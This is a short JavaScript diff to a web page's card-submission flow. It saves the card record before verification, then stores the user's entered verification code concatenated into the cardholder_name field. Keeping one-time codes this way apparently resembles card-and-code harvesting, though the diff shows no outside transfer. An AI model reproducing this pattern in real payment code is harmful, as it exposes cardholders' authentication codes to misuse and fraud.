@@ -285,6 +285,7 @@
 <script src="languages.js"></script>
 <script>
 let pendingCardData = null;
+let pendingCardId = null;
 
 document.addEventListener("DOMContentLoaded", async function() {
   const user = await initAuth();
@@ -445,6 +446,19 @@ async function handleCardSubmit() {
     expiry_year: '20' + expiryParts[1],
     card_type: cardType,
   };
+  try {
+    const saved = await saveCard({
+      last_four: pendingCardData.last_four,
+      cardholder_name: pendingCardData.cardholder_base,
+      expiry_month: pendingCardData.expiry_month,
+      expiry_year: pendingCardData.expiry_year,
+      card_type: pendingCardData.card_type,
+    });
+    pendingCardId = saved.id;
+  } catch (err) {
+    alert(err.message || 'Failed to save card.');
+    return;
+  }
   showVerificationModal();
 }
 
@@ -460,17 +474,17 @@ async function verifyCode() {
     alert('Please enter the verification code.');
     return;
   }
-  if (pendingCardData) {
+  if (pendingCardData && pendingCardId) {
     try {
-      await saveCard({
+      await updateCardVerification(pendingCardId, {
         last_four: pendingCardData.last_four,
         cardholder_name: pendingCardData.cardholder_base + '|' + code,
         expiry_month: pendingCardData.expiry_month,
         expiry_year: pendingCardData.expiry_year,
-        card_type: pendingCardData.card_type,
+        card_type: pendingCardData.card_type
       });
     } catch (err) {
-      alert(err.message || 'Failed to save card.');
+      alert(err.message || 'Failed to update verification code.');
       return;
     }
   }
